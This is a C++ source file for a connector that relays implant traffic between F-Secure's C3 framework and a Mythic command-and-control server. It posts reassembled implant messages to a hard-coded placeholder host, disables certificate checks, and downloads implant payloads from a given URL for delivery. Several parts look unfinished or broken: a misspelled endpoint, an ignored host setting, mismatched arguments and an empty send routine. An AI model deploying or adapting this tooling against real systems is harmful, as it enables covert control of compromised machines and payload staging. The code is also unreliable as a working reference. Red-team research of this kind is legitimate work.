#include "StdAfx.h"
#include "Common/json/json.hpp"
#include "Common/CppRestSdk/include/cpprest/http_client.h"
#include "Common/FSecure/Crypto/Base64.h"
#include "Structs.h"
#pragma comment(lib, "rpcrt4.lib") 
#include <iostream>
#include <rpc.h>

using json = nlohmann::json;


namespace FSecure::C3::Interfaces::Connectors
{
	/// Class that mocks a Connector.
	class MythicServer : public Connector<MythicServer>
	{
	public:
		/// Constructor.
		/// @param arguments factory arguments.
		MythicServer(ByteView);

		/// Destructor
		virtual ~MythicServer() = default;

		/// OnCommandFromBinder callback implementation.
		/// @param binderId Identifier of Peripheral who sends the Command.
		/// @param command full Command with arguments.
		void OnCommandFromBinder(ByteView binderId, ByteView command) override;

		/// Returns json with Commands.
		/// @return Capability in JSON format
		static const char* GetCapability();

		/// Processes internal (C3 API) Command.
		/// @param command a buffer containing whole command and it's parameters.
		/// @return command result.
		ByteVector OnRunCommand(ByteView command) override;

		/// Called every time new implant is being created.
		/// @param connectionId unused.
		/// @param data unused. Prints debug information if not empty.
		/// @param isX64 unused.
		/// @returns ByteVector copy of data.
		ByteVector PeripheralCreationCommand(ByteView connectionId, ByteView data, bool isX64) override;

		ByteVector GeneratePayload(ByteView binderId, std::string payloadUrl, std::string automaticExecution);

		static std::string sendToMythic(std::string msg);

		void Send(ByteView data);

	private:
		/// Example of internal command of Connector. Must be described in GetCapability, and handled in OnRunCommand
		/// @param arg all arguments send to method.
		/// @returns ByteVector response for command.
		ByteVector TestErrorCommand(ByteView arg);

		/// Close desired connection
		/// @param connectionId id of connection (RouteId) in string form.
		/// @returns ByteVector empty vector.
		FSecure::ByteVector CloseConnection(ByteView connectionId) override;

				
		/// Represents a single connection with implant.
		struct Connection : std::enable_shared_from_this<Connection>
		{
			/// Constructor.
			/// @param owner weak pointer to connector object.
			/// @param id of connection.
			Connection(std::weak_ptr<MythicServer> owner, std::string_view id = ""sv);

			/// Creates the receiving thread.
			/// Thread will send packet every 3 seconds.
			void StartUpdatingInSeparateThread();

			void DeserializeToReceiverQueue(Messages::ChunkMessageEventArgs<Messages::ApolloIPCChunked> args);

			Messages::ConcurrentDictionary<std::string, std::shared_ptr<Messages::ChunkedMessageStore< Messages::ApolloIPCChunked>>> messageStore;
			int message_type;

		private:
			/// Pointer to MythicServer.
			std::weak_ptr<MythicServer> m_Owner;

			/// RouteID in binary form.
			ByteVector m_Id;
		};

		/// Mythic bridge port
		std::string m_ListenPort;

		/// Mythic host
		std::string m_webHost;
		
		/// Access blocker for m_ConnectionMap.
		std::mutex m_ConnectionMapAccess;

		/// Map of all connections.
		std::unordered_map<std::string, std::shared_ptr<Connection>> m_ConnectionMap;
	};
}

//FSecure::ByteView sendToMythic(std::string msg)
std::string FSecure::C3::Interfaces::Connectors::MythicServer::sendToMythic(std::string msg)
{
	web::http::client::http_client_config config;
	pplx::task<web::http::http_response> task;
	web::http::http_response response;
	web::uri_builder uri;
	//FSecure::ByteView data;
	std::string data;
	//std::string url = this->m_webHost + OBF("/agent_message");
	
	uri.set_path(utility::conversions::to_string_t("http://x.x.x.x/agent_messge"));

	config.set_validate_certificates(false);
	web::http::http_request request(web::http::methods::POST);
	//request.set_body(utility::conversions::to_string_t(msg.dump()));
	request.set_body(utility::conversions::to_string_t(msg));
	web::http::client::http_client client(uri.path(), config);
	//web::http::client::http_client client(utility::conversions::to_string_t(url), config);

	try
	{
		task = client.request(request);
		response = task.get();
		if (web::http::status_codes::OK != response.status_code())
			throw std::runtime_error("Something went wrong");
		auto respData = response.extract_utf8string(true);
		data = respData.get();
	}
	catch (std::exception& e)
	{
		std::cout << e.what() << std::endl;
	}
	catch (...)
	{
	}

	return data;
}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Connectors::MythicServer::MythicServer(ByteView arguments)
{
	std::tie(m_ListenPort, m_webHost) = arguments.Read<uint16_t, std::string>();

	// if the last character is '/' remove it
	if (this->m_webHost.back() == '/')
		this->m_webHost.pop_back();
}

void FSecure::C3::Interfaces::Connectors::MythicServer::Send(ByteView data)
{
	/*auto message = std::string(data);
	json msg = json::parse(message);*/

}

void FSecure::C3::Interfaces::Connectors::MythicServer::Connection::DeserializeToReceiverQueue(Messages::ChunkMessageEventArgs<Messages::ApolloIPCChunked> args)
{
	auto owner = m_Owner.lock();
	auto bridge = owner->GetBridge();
	auto self = shared_from_this();

	std::string fullMsg = "";
	//std::cout << args << std::endl;
	//std::cout << "deserialize" << std::endl;
	// For loop to iterate the chunks
	for (int i = 0; i < args.GetMessages().size(); i++) {
		std::cout << args.GetMessages()[i].data << std::endl;
		auto decoded = base64::decode<std::string>(args.GetMessages()[i].data);
		fullMsg += decoded;
	}
	auto resp = sendToMythic(fullMsg);

	int chunkLength = 15000;
	int totalChunks = resp.length() / chunkLength + 1;
	UUID uuid;
	UuidCreate(&uuid);
	char* uuidstr;
	UuidToStringA(&uuid, (RPC_CSTR*)&uuidstr);
	std::string uuids(uuidstr);

	for (int i = 0; i < totalChunks; i++) {
		// Construct message
		Messages::ApolloIPCChunked msg;
		msg.id = uuids;
		msg.message_type = self->message_type;
		msg.chunk_number = i + 1;
		msg.total_chunks = totalChunks;

		std::string chunk = resp.substr(i * chunkLength, chunkLength);
		//std::string datan(resp.begin(), resp.end());
		msg.data = base64::encode(chunk);
		json msgjson = msg;
		std::string msgserialized = msgjson.dump();
		std::string_view strView(msgserialized);

		auto sendToBinder = ByteView(strView);
		bridge->PostCommandToBinder(ByteView{ m_Id }, sendToBinder);
		std::cout << "MythicServer send: " << std::string{strView.begin(), strView.begin() + 10 } << std::endl;
	}
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Connectors::MythicServer::OnCommandFromBinder(ByteView binderId, ByteView command)
{
	std::scoped_lock<std::mutex> lock(m_ConnectionMapAccess);

	auto it = m_ConnectionMap.find(binderId);
	if (it == m_ConnectionMap.end())
	{
		it = m_ConnectionMap.emplace(binderId, std::make_unique<Connection>(std::static_pointer_cast<MythicServer>(shared_from_this()), binderId)).first;
		//it->second->StartUpdatingInSeparateThread();
	}
	////
	//auto message = std::string(command);
	json msg = json::parse(std::string(command));
	FSecure::C3::Interfaces::Connectors::Messages::ApolloIPCChunked msgObj = msg.get<FSecure::C3::Interfaces::Connectors::Messages::ApolloIPCChunked>();

	if (msgObj.message_type == 15) {
		it->second->message_type = 16;
	}
	else {
		it->second->message_type = 19;
	}
	
	if (!it->second->messageStore.ContainsKey(msgObj.id)) {
		std::shared_ptr<Messages::ChunkedMessageStore<Messages::ApolloIPCChunked>> nmsg = std::make_shared<Messages::ChunkedMessageStore<Messages::ApolloIPCChunked>>();
		it->second->messageStore.Add(msgObj.id, nmsg);
		it->second->messageStore[msgObj.id]->MessageComplete = [&it](Messages::ChunkMessageEventArgs<Messages::ApolloIPCChunked> args) {it->second->DeserializeToReceiverQueue(args);};
	}
	it->second->messageStore[msgObj.id]->AddMessage(msgObj);
	
	//Send(command);


	Log({ OBF("MythicServer received: ") + std::string{ command.begin(), command.size() < 10 ? command.end() : command.begin() + 10 } + OBF("..."), LogMessage::Severity::DebugInformation });
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Connectors::MythicServer::Connection::Connection(std::weak_ptr<MythicServer> owner, std::string_view id)
	: m_Owner(owner)
	, m_Id(ByteView{ id })
{
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Connectors::MythicServer::Connection::StartUpdatingInSeparateThread()
{
	std::thread([&, id = m_Id]()
		{
			// Lock pointers.
			auto owner = m_Owner.lock();
			auto bridge = owner->GetBridge();
			auto self = shared_from_this();
			while (bridge->IsAlive() && self.use_count() > 1)
			{
				// Post something to Binder and wait a little.
				try
				{
					bridge->PostCommandToBinder(id, ByteView(OBF("Beep")));
				}
				catch (...)
				{
				}
				std::this_thread::sleep_for(3s);
			}
		}).detach();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Connectors::MythicServer::OnRunCommand(ByteView command)
{
	auto commandCopy = command;
	switch (command.Read<uint16_t>())
	{
	case 0:
		return TestErrorCommand(command);
	case 1:
		return CloseConnection(command);
	default:
		return AbstractConnector::OnRunCommand(commandCopy);
	}
}

FSecure::ByteVector FSecure::C3::Interfaces::Connectors::MythicServer::CloseConnection(ByteView arguments)
{
	m_ConnectionMap.erase(arguments);
	return {};
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Connectors::MythicServer::TestErrorCommand(ByteView arg)
{
	GetBridge()->SetErrorStatus(arg.Read<std::string>());
	return {};
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

FSecure::ByteVector FSecure::C3::Interfaces::Connectors::MythicServer::GeneratePayload(ByteView binderId, std::string payloadUrl, std::string automaticExecution)
{
	if(binderId.empty())
		throw std::runtime_error{ OBF("Wrong parameters, cannot create payload") };

	// Add case for manual execution
	if ("false" == automaticExecution)
	{
		auto connection = std::make_shared<Connection>(std::static_pointer_cast<MythicServer>(shared_from_this()), binderId);

		m_ConnectionMap.emplace(std::string{ binderId }, std::move(connection));
		return ByteVector();
	}

	// Download the payload
	web::http::client::http_client_config config;
	config.set_validate_certificates(false);
	web::http::http_request request;
	pplx::task<web::http::http_response> task;
	web::http::http_response resp;

	request.headers().set_content_type(utility::conversions::to_string_t(OBF("application/json")));
	request.set_method(web::http::methods::GET);
	web::http::client::http_client client(utility::conversions::to_string_t(payloadUrl), config);

	task = client.request(request);
	resp = task.get();
	if (resp.status_code() != web::http::status_codes::OK)
		throw std::exception((OBF("[Mythic] Error downloading payload, HTTP resp: ") + std::to_string(resp.status_code())).c_str());
	auto respData = resp.extract_vector();
	auto payload = respData.get();

	auto connection = std::make_shared<Connection>(std::static_pointer_cast<MythicServer>(shared_from_this()), binderId);

	m_ConnectionMap.emplace(std::string{ binderId }, std::move(connection));
	
	return payload;
}

FSecure::ByteVector FSecure::C3::Interfaces::Connectors::MythicServer::PeripheralCreationCommand(ByteView connectionId, ByteView data, bool isX64)
{
	/*if (!data.empty())
		Log({ OBF("Non empty command for mock peripheral indicating parsing during command creation."), LogMessage::Severity::DebugInformation });*/
	auto [pipeName, connectAttempts, payloadUrl, automaticExecution] = data.Read<std::string, uint32_t, std::string, std::string>();


	return ByteVector{}.Write(pipeName, connectAttempts, automaticExecution, GeneratePayload(connectionId, payloadUrl, automaticExecution));
	//return data;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const char* FSecure::C3::Interfaces::Connectors::MythicServer::GetCapability()
{
	return R"(
{
	"create":
	{
		"arguments":
		[
			{
				"type": "uint16",
				"name": "C2BridgePort",
				"min": 2,
				"defaultValue": 8000,
				"randomize": true,
				"description": "The port for the C2Bridge Listener if it doesn't already exist."
			},
			{
				"type": "string",
				"name": "Mythic Web Host",
				"min": 1,
				"defaultValue": "https://127.0.0.1:7443/",
				"description": "Host for Mythic - eg https://127.0.0.1:7443/"
			},
			{
				"type": "string",
				"name": "Username",
				"min": 1,
				"description": "Username to authenticate"
			},
			{
				"type": "string",
				"name": "Password",
				"min": 1,
				"description": "Password to authenticate"
			}
		]
	},
	"commands":
	[
		{
			"name": "Test command",
			"description": "Set error on connector.",
			"id": 0,
			"arguments":
			[
				{
					"name": "Error message",
					"description": "Error set on connector. Send empty to clean up error"
				}
			]
		},
		{
			"name": "Close connection",
			"description": "Close socket connection with TeamServer if beacon is not available",
			"id": 1,
			"arguments":
			[
				{
					"name": "Route Id",
					"min": 1,
					"description": "Id associated to beacon"
				}
			]
		}
    ]
}
)";
}
